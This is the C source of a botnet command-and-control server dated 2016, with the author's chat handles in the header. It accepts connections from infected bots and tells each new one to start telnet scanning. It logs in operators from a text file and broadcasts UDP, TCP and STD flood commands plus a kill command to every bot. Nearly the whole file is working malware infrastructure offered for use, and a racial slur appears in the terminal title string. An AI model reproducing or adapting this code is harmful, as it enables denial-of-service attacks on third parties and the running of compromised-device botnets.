/*
Screen Usage: screen ./server [client-port] [threads] [cnc-port]
Skype: b1narythag0d
XMPP: b1nary@nigge.rs
Made Date: 7-29-16
Title: linux.c
Description: Linux Based Server side
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000


struct login_info {
	char username[20];
	char password[20];
};
static struct login_info accounts[10];

struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        int connected;
} managements[MAXFDS];

struct args {
        int sock;
        struct sockaddr_in cli_addr;
};


static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
//////////////////////////////////


int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}



void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}


static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;     /* Return IPv4 and IPv6 choices */
	hints.ai_socktype = SOCK_STREAM; /* We want a TCP socket */
    hints.ai_flags = AI_PASSIVE;     /* All interfaces */
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}


void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[33m", 5, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL);
                }
                printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[31m> \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}

void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
				{
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip)
					{
						dup = 1;
						break;
					}
				}
				if(dup)
				{
					if(send(infd, "!* LOLNOGTFO\n", 13, MSG_NOSIGNAL) == -1)
					{
						close(infd);
						continue;
					}
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1)
				{
					close(infd);
					break;
				}
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1)
				{
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
				send(infd, "!* SCANNER TELNET ON\n", 21, MSG_NOSIGNAL);
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1)
			{
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0)
				{
					if(strstr(buf, "\n") == NULL)
					{
						done = 1;
						break;
					}
					trim(buf);
					if(strcmp(buf, "PING") == 0)
					{
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1)
						{
							done = 1;
							break;
						}
						continue;
					}
					if(strcmp(buf, "PONG") == 0)
					{
						continue;
					}
					printf("buf: \"%s\"\n", buf);
				}
				if (count == -1)
				{
					if (errno != EAGAIN)
					{
						done = 1;
					}
					break;
				}
				else if (count == 0)
				{
					done = 1;
					break;
				}
			if (done)
			{
				client->connected = 0;
				close(datafd);

			}
			}
		}
		}
	}
}

unsigned int BotsConnected()
{
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++)
	{
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}

void *TitleWriter(void *sock)
{
	int datafd = (int)sock;
    char string[2048];
    while(1)
	{
		memset(string, 0, 2048);
        sprintf(string, "%c]0;Bots: %d| Niggas: %d%c", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
	}
}

int Find_Login(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL)
	{
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL)
	{
        if((strstr(temp, str)) != NULL)
		{
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock)
{
	int datafd = (int)sock;
	int find_line;
    OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp))
	{
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1)
	{
		fscanf(fp, "%s:%s", accounts[j].username, accounts[j].password);
		++j;
	}

        if(send(datafd, "\x1b[30mUsername:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
		
        if(strcmp(nickstring, accounts[find_line].username) == 0)
		{
        if(send(datafd, "\x1b[30mPassword:\x1b[30m ", 22, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto FAILED;
        memset(buf, 0, 2048);
		
        goto CNC;
        }
		
		
//////////////////////////////////


		
//////////////////////////////////
/* 			FAILED 				*/
//////////////////////////////////

        FAILED:
			if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
			goto end;
		
		
		CNC:
		pthread_create(&title, NULL, &TitleWriter, sock);
		
		
		
//////////////////////////////////
/* 			BANNER 				*/
//////////////////////////////////
char Linux_Shell_line [80];
sprintf(Linux_Shell_line, "[%s@BigBoatReppin]~$ ", accounts[find_line].username);
if(send(datafd, Linux_Shell_line, strlen(Linux_Shell_line), MSG_NOSIGNAL) == -1) return;



//////////////////////////////////

		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0)
		{



//////////////////////////////////	
/* 			COMMANDS 			*/
//////////////////////////////////

			if(strstr(buf, "BOTS"))
				{
				sprintf(botnet, "Bot Count: %d\r\n", BotsConnected(), OperatorsConnected);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				continue;
				}
			else if(strstr(buf, "bots"))
				{
				sprintf(botnet, "Bot Count: %d\r\n", BotsConnected(), OperatorsConnected);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				continue;
				}
			
			
			
			if(strstr(buf, "USERS"))
				{
				sprintf(botnet, "Users: %d\r\n", BotsConnected(), OperatorsConnected);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				continue;
				}
			else if(strstr(buf, "users"))
				{
				sprintf(botnet, "Users: %d\r\n", BotsConnected(), OperatorsConnected);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				continue;
				}
			
			
			
			if(strstr(buf, "HELP"))
				{
				char helpline1 [80];char helpline2 [80];char helpline3 [80];char helpline4 [80];char helpline5 [80];
				pthread_create(&title, NULL, &TitleWriter, sock);

				sprintf(helpline1,  "~ ATTACK COMMANDS ~\r\n");
				sprintf(helpline2,  "UDP    - !* UDP IP Port Time 32 0 10\r\n");
				sprintf(helpline3,  "TCP    - !* TCP IP Port Time 32 all 0 10\r\n");
				sprintf(helpline4,	"STD    - !* STD IP Port Time\r\n");
				sprintf(helpline5,  "KILL   - !* KILLATTK | KILL\r\n");

				if(send(datafd, helpline1, strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline2, strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline3, strlen(helpline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline4, strlen(helpline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline5, strlen(helpline5), 	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
				continue;
				}
			else if(strstr(buf, "help"))
				{
				char helpline1 [80];char helpline2 [80];char helpline3 [80];char helpline4 [80];char helpline5 [80];
				pthread_create(&title, NULL, &TitleWriter, sock);


				sprintf(helpline1,  "~ ATTACK COMMANDS ~\r\n");
				sprintf(helpline2,  "UDP    - !* UDP IP Port Time 32 0 10\r\n");
				sprintf(helpline3,  "TCP    - !* TCP IP Port Time 32 all 0 10\r\n");
				sprintf(helpline4,	"STD    - !* STD IP Port Time\r\n");
				sprintf(helpline5,  "KILL   - !* KILLATTK | KILL\r\n");

				if(send(datafd, helpline1, strlen(helpline1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline2, strlen(helpline2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline3, strlen(helpline3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline4, strlen(helpline4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, helpline5, strlen(helpline5), 	MSG_NOSIGNAL) == -1) goto end;
				pthread_create(&title, NULL, &TitleWriter, sock);
				continue;
				}
			
			
			
			if(strstr(buf, "KILL"))
				{
				sprintf(botnet, "!* KILLATTK\r\n");
				broadcast(botnet, datafd, "!* KILLATTK");
				}
			else if(strstr(buf, "kill"))
				{
				sprintf(botnet, "!* KILLATTK\r\n");
				broadcast(botnet, datafd, "!* KILLATTK");
				continue;
				}
			
			
			
			if(strstr(buf, "CLEAR"))
				{
				sprintf(botnet, "\033[2J\033[1;1H");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
				continue;
				}
			else if(strstr(buf, "clear"))
				{
				sprintf(botnet, "\033[2J\033[1;1H");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
				continue;
				}
			
			
			
			if(strstr(buf, "LOGOUT"))
				{
				goto end;
				}
			else if(strstr(buf, "logout"))
				{
				goto end;
				}
			
			
//////////////////////////////////
                trim(buf);
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].username, buf);
				FILE *LogFile;
                LogFile = fopen("log.txt", "a");
				time_t now;
				struct tm *gmt;
				char formatted_gmt [50];
				char lcltime[50];
				now = time(NULL);
				gmt = gmtime(&now);
				strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
                fprintf(LogFile, "[%s] %s: %s\n", formatted_gmt, accounts[find_line].username, buf);
                fclose(LogFile);
                broadcast(buf, datafd, accounts[find_line].username);
                memset(buf, 0, 2048);
			}
		
		
		end:
			managements[datafd].connected = 0;
			close(datafd);
			OperatorsConnected--;
}


void *BotListener(int port)
{
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1)
	{
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
	}
}


int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
		port = atoi(argv[3]);
		if (argc != 4)
        {
                fprintf (stderr, "%s [BOT PORT] [THREADS] [CNC PORT]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
		
		fileFD = NULL;
        threads = atoi(argv[2]);
		
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
		
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
		
        s = listen (listenFD, SOMAXCONN);
        if (s == -1)
		{
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1)
		{
			perror ("epoll_create");
			abort ();
        }
		
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
		{
			perror ("epoll_ctl");
			abort ();
        }
		
        pthread_t thread[threads + 2];
        while(threads--)
		{
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
		
        while(1)
		{
			broadcast("PING", -1, "LEL");
			sleep(60);
        }
		
        close (listenFD);
        return EXIT_SUCCESS;
}